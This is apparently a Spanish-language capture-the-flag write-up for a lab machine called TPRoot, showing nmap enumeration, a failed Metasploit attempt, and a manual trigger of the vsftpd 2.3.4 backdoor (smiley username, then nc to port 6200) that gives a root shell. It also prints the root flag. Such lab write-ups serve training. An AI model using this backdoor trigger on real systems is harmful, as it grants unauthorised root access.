# 🎯 Máquina: TPRoot
**IP:** 172.17.0.2
**OS:** Linux (Docker)
**Dificultad:** Muy Fácil

---
## 1. 🔍 Enumeración
nmap -p 21,80 -sC -sV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-06 18:27 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000060s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: E2:3D:35:84:32:3E (Unknown)
Service Info: OS: Unix

- versión de vsftpd 2.3.4 vulnerable a **Backdoor Command Execution**
## 2. 🔓 Explotación (Foothold)
```bash
msfconsole -q
search vsftpd 2.3.4
vsftpd_234_backdoor VSFTPD 2.3.4 BackdoorCommand Execution
```
Seleccionamos el exploit en metasploit y lo configuramos para correr en la victima:
```bash
set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
set LHOST 172.17.0.1
LHOST => 172.17.0.1
run
[*] Started reverse TCP handler on 172.17.0.1:4444
[*] 172.17.0.2:21 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.17.0.2:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 172.17.0.2:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
[+] 172.17.0.2:21 - Backdoor has been spawned!
[*] Exploit completed, but no session was created.
```
Lo que indica que metasploit está fallando, puede haber un firewall o algo bloqueando la conexión
## 3. 🚀 Escalada de Privilegios
Aprovechando la conocida vulnerabilidad de vsftpd 2.3.4 abrí la conexión con FTP:
```bash
ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 2.3.4)
Name (172.17.0.2:kali): prueba:)
331 Please specify the password.
Password:1234
```
Quedando congelada la instancia y con el puerto 6200 abierto, realizando conexión remota con nc:
```bash
nc 172.17.0.2 6200
whoami
root
```
Obteniendo permisos de Root con la vulnerabilidad explotada correctamente
## 4. 🚩 Banderas (Flags)
- **User:** N/A
- **Root**: 261fd3f32200f950f231816b4e9a0594